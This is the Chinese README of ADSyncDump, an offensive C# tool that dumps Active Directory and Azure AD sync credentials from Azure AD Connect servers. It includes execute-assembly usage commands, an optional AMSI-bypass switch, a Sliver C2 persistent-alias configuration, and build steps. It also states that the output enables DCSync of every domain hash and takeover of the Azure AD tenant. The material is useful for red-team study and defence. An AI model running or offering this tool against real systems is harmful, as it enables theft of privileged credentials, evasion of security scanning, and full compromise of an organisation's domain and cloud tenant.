# ADSyncDump
**Language**: [English](../README.md) | **中文** | [Français](README.fr.md)
<img align="right" src="../assets/ADSyncDump-Logo.png" alt="ADSyncDump Logo" width="220">

Azure AD Connect 服务器内存凭证提取工具，无需派生子进程即可提取本地Active Directory和Azure Active Directory同步凭证。

<p>
  <img src="https://img.shields.io/badge/platform-Windows-blue" alt="Platform">
  <img src="https://img.shields.io/badge/language-C%23-239120" alt="Language">
  <a href="../LICENSE"><img src="https://img.shields.io/badge/license-MIT-green" alt="License"></a>
</p>

<br clear="right">

## 功能
- 提取本地AD同步账号凭证（MSOL_*用户，具备DCSync/目录复制权限）
- 提取Azure AD同步账号凭证（等效全局管理员权限，可接管Azure租户）
- 通过ADSync服务令牌模拟在内存中解密，无需启动PowerShell/子进程
- 可选AMSI绕过（默认关闭）
- 自动检测LocalDB实例，支持所有AD Connect版本（v1/v2/v3）
- 通过服务控制管理器自动定位服务进程
- 结构化执行日志
- C# 5语法兼容，可通过系统自带csc.exe编译，无外部依赖
- 兼容C2 execute-assembly（Sliver、Cobalt Strike等）

## 使用方法
```
# 默认运行（不启用AMSI绕过）
execute-assembly ADSyncDump.exe -p notepad.exe

# 启用AMSI绕过
execute-assembly ADSyncDump.exe -p notepad.exe -- --bypass-amsi
```

通过`execute-assembly`进行的内存反射加载会自动绕过AMSI吗？[详见](TECHNICAL_DETAILS.zh-CN.md#通过execute-assembly进行的内存反射加载会自动绕过amsi吗)

### Sliver C2 持久别名
你可以将ADSyncDump注册为Sliver持久别名，跨会话直接使用`adsyncdump`命令，无需每次重新上传二进制文件。

1. 创建别名目录并放入二进制文件：
```
mkdir -p ~/.sliver-client/aliases/adsyncdump
cp ADSyncDump.exe ~/.sliver-client/aliases/adsyncdump/
```

2. 在同目录下创建`alias.json`：
```json
{
  "name": "ADSyncDump",
  "version": "v0.8.1",
  "command_name": "adsyncdump",
  "original_author": "RedteamNotes",
  "repo_url": "https://github.com/RedteamNotes/ADSyncDump",
  "help": "从AD Connect服务器提取AD和Azure AD凭证",
  "long_help": "ADSyncDump通过内存服务令牌模拟从Azure AD Connect服务器提取本地AD和Azure AD同步凭证，使用--bypass-amsi启用AMSI绕过。",
  "entrypoint": "Main",
  "allow_args": true,
  "default_args": "",
  "is_reflective": false,
  "is_assembly": true,
  "files": [
    {
      "os": "windows",
      "arch": "amd64",
      "path": "ADSyncDump.exe"
    }
  ]
}
```

3. 加载并验证：
```
[sliver] > aliases load ~/.sliver-client/aliases/adsyncdump/alias.json
[*] ADSyncDump alias has been loaded

[sliver] (SESSION) > adsyncdump --bypass-amsi
```

加载后，`adsyncdump <参数>` 等效于 `execute-assembly ADSyncDump.exe -p notepad.exe <参数>`。别名加载后在Sliver客户端重启后仍然保留，升级时替换别名目录中的二进制文件即可。

### 参数
| 参数 | 说明 |
|-----------|-------------|
| `--bypass-amsi` | 启用内存AMSI补丁 |

## 输出
工具将返回两套凭证：
1. 本地AD：具备目录复制权限的MSOL_*账号，可用于DCSync导出域内所有哈希
2. Azure AD：等效全局管理员权限的同步服务账号，可用于接管Azure AD租户

## 编译
### 编译要求
- **仅支持Windows编译**：编译需要系统.NET Framework C#编译器，不支持Linux/MacOS编译（工具仅面向Windows平台，依赖Win32 API以及LocalDB、mcrypt.dll等Windows专属组件）。
- .NET Framework 4.8（Windows 10 1903+、Windows Server 2016+预装），无需安装Visual Studio或额外SDK。
- 必须编译为x64：AD Connect以64位进程运行，32位编译版本无法访问LocalDB也无法执行令牌模拟。

### 一键编译
直接在Windows上运行`build.bat`，脚本会自动定位系统csc.exe编译器，生成可用的x64二进制文件。

### 手动编译
在命令提示符或PowerShell中执行以下命令：
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /platform:x64 /target:exe /out:ADSyncDump.exe ADSyncDump.cs
```

### 编译说明
- 无需外部依赖或NuGet包，所有使用的程序集均为.NET Framework 4.x默认内置。
- [Releases](https://github.com/RedteamNotes/ADSyncDump/releases)中提供预编译x64二进制文件，可直接使用无需自行编译。
- 请勿使用.NET Core/.NET 5+编译，二进制必须面向.NET Framework 4.x才能在AD Connect服务器上无额外运行时依赖运行。

## 注意事项
- 需要AD Connect服务器本地管理员权限
- 所有解密操作在内存中完成，不会派生任何子进程
- 已在Windows Server 2016/2019/2022 + AD Connect v1/v2/v3环境测试通过

## 版本历史
### v0.8.1
- 首次公开发布
- 支持本地AD + Azure AD凭证提取
- 令牌模拟内存解密
- 可选AMSI绕过
- 自动检测数据库实例和服务PID

## 其他文档
- [技术深度解析](TECHNICAL_DETAILS.zh-CN.md) - 完整底层架构、加密原理、实现决策、OpSec注意事项和故障解决说明。
